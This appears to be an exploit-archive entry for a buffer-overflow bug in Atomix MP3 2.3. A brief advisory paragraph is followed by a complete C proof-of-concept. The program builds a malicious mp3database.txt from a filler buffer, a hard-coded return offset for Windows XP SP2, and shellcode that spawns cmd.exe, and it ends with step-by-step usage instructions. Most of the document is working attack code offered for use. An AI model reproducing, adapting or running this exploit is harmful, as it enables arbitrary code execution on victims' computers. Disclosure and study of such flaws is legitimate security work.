source: http://www.securityfocus.com/bid/23756/info

Atomix MP3 is prone to a buffer-overflow vulnerability because the application fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.

An attacker could exploit this issue by enticing a victim to load a malicious MP3 file. If successful, the attacker can execute arbitrary code in the context of the affected application.

////////////////////////////////// [ STARTING CODE ]
////////////////////////////////////////////////////
////
////  [ Explanation ] this probe of concept make 
////  a malicious file that exploit the error.
////  
////
////  [ Note ] 
////  it was coded for Windows XP with SP2-es
////  if you want to try it into your own PC
////  it is necessary that you change this Offsets 
////  for your own offsets.
////
////     on: 
////  char offset[]="";
////     AND
////  mov ebx,0x77BF93C7
////
////                Enjoy it n_nU!..
////    Coded by preth00nker (using Mexican skill!)

#include <stdio.h>
#include <conio.h>
#include <string.h>

char shellcode[] =     //A simple CMD Call =)
"\x55"                 //push ebp
"\x8B\xEC"             //mov ebp,esp
"\x33\xFF"             //xor edi,edi
"\x57"                 //push edi
"\xC6\x45\xFC\x63"     //mov byte ptr [ebp-04h],63h
"\xC6\x45\xFD\x6D"     //mov byte ptr [ebp-03h],6Dh
"\xC6\x45\xFE\x64"     //mov byte ptr [ebp-02h],64h
"\x8D\x45\xFC"         //lea eax,[ebp-04h]
"\x50"                 //push eax
"\xBB\xC7\x93\xBF\x77" //mov ebx,0x77BF93C7
"\xFF\xD3";            //call ebx


                       /*Evilbuffer - 520 Bytes Free4exploit*/
char evilbuffer[521] = "";
                       /*Data Base for songs found into the computer*/
char file[]          = "mp3database.txt"; 
                       /*Call ESP SP2-es*/
char offset[]        = "\x8B\x51\x81\x7C";
char temp[1024];

int main(){
    printf("\n\n##################################################\n");
    printf("######\n");    
    printf("######          Exploit Atomix 2.3\n");    
    printf("######             By Preth00nker\n");    
    printf("######     Preth00nker [at] gmail [dot] com\n");    
    printf("######         http://www.mexhackteam.org\n\n\n");
    printf("######         http://www.prethoonker.tk\n\n\n");
    FILE *fich;
   	memset(evilbuffer,'M',520);
    fich=fopen(file,"w+");
    printf(" (*) Creating the file: %s\n", file);
    strcpy(temp,evilbuffer);
    printf(" (*) Adding the evilbuffer\n");
    strcat(temp,offset);
    printf(" (*) Adding the Offset: %s\n", offset);
    strcat(temp,shellcode);
    printf(" (*) Adding the Sellcode\n");
    fwrite(temp, strlen(temp),1, fich);
    printf(" (*) Writting into the file\n");
    printf("      [ Usage: ]\n");    
    printf("Step 1.- Generate the Evil File into the %ProgramFiles%\\AtomixMP3\\ \n");    
    printf("Step 2.- Run atomixmp3.exe\n");    
    printf("Step 3.- Click On Search module and Click (again) on the unique file found.\n");
    printf("have fun =)!");
    fclose(fich);   
    return 0;
}
////
////
////////////////////////////////////////// [ E O F ]
////////////////////////////////////////////////////